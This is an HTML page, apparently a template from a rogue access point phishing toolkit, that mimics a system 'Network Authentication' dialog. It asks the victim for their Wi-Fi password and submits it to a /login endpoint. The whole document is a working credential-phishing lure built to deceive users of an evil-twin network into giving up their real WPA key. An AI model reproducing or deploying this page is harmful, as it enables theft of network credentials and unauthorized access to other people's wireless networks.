<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wi-Fi — Connection Required</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
               background: #2d2d2d; min-height: 100vh; display: flex;
               align-items: center; justify-content: center; }
        .nm-window { width: 400px; background: #3c3c3c; border-radius: 10px;
                     box-shadow: 0 10px 40px rgba(0,0,0,0.5); overflow: hidden; }
        .title-bar { background: #323232; padding: 8px 12px; display: flex;
                     align-items: center; }
        .title-bar .dots { display: flex; gap: 6px; }
        .title-bar .dot { width: 12px; height: 12px; border-radius: 50%; }
        .title-bar .dot.red { background: #ff5f57; }
        .title-bar .dot.yellow { background: #febc2e; }
        .title-bar .dot.green { background: #28c840; }
        .title-bar .title { flex: 1; text-align: center; color: #ccc;
                            font-size: 13px; font-weight: 500; }
        .body { padding: 24px; }
        .wifi-icon { text-align: center; margin-bottom: 16px; }
        .wifi-icon svg { width: 48px; height: 48px; }
        h2 { color: #e0e0e0; font-size: 15px; text-align: center; margin-bottom: 4px; }
        .network-name { text-align: center; color: #87ceeb; font-size: 17px;
                        font-weight: 600; margin-bottom: 16px; }
        .msg { color: #aaa; font-size: 12px; text-align: center; margin-bottom: 20px; }
        label { display: block; font-size: 12px; color: #bbb; margin-bottom: 4px; }
        input[type="password"] { width: 100%; padding: 10px 12px; background: #4a4a4a;
                                  border: 1px solid #555; border-radius: 6px;
                                  color: #fff; font-size: 14px; margin-bottom: 16px; }
        input:focus { outline: none; border-color: #87ceeb; }
        .show-pass { display: flex; align-items: center; gap: 6px;
                     font-size: 12px; color: #999; margin-bottom: 20px; }
        .btn-row { display: flex; gap: 10px; justify-content: flex-end; }
        .btn { padding: 8px 20px; border: none; border-radius: 6px;
               font-size: 13px; cursor: pointer; }
        .btn-cancel { background: #4a4a4a; color: #ccc; }
        .btn-connect { background: #2980b9; color: #fff; font-weight: 600; }
        .btn-connect:hover { background: #3498db; }
    </style>
</head>
<body>
    <div class="nm-window">
        <div class="title-bar">
            <div class="dots">
                <div class="dot red"></div>
                <div class="dot yellow"></div>
                <div class="dot green"></div>
            </div>
            <div class="title">Network Authentication</div>
        </div>
        <div class="body">
            <div class="wifi-icon">
                <svg viewBox="0 0 24 24" fill="none" stroke="#87ceeb" stroke-width="2">
                    <path d="M5 12.55a11 11 0 0 1 14.08 0"/>
                    <path d="M1.42 9a16 16 0 0 1 21.16 0"/>
                    <path d="M8.53 16.11a6 6 0 0 1 6.95 0"/>
                    <line x1="12" y1="20" x2="12.01" y2="20"/>
                </svg>
            </div>
            <h2>Authentication required for</h2>
            <p class="network-name">Wi-Fi Network</p>
            <p class="msg">Enter the password for this wireless network.</p>
            <form method="POST" action="/login">
                <label for="psk">Password</label>
                <input type="password" id="psk" name="wfphshr-wpa-password" placeholder="Wi-Fi password" required>
                <div class="show-pass">
                    <input type="checkbox" id="show" onclick="document.getElementById('psk').type=this.checked?'text':'password'">
                    <label for="show" style="margin:0;">Show password</label>
                </div>
                <div class="btn-row">
                    <button type="button" class="btn btn-cancel">Cancel</button>
                    <button type="submit" class="btn btn-connect">Connect</button>
                </div>
            </form>
        </div>
    </div>
</body>
</html>
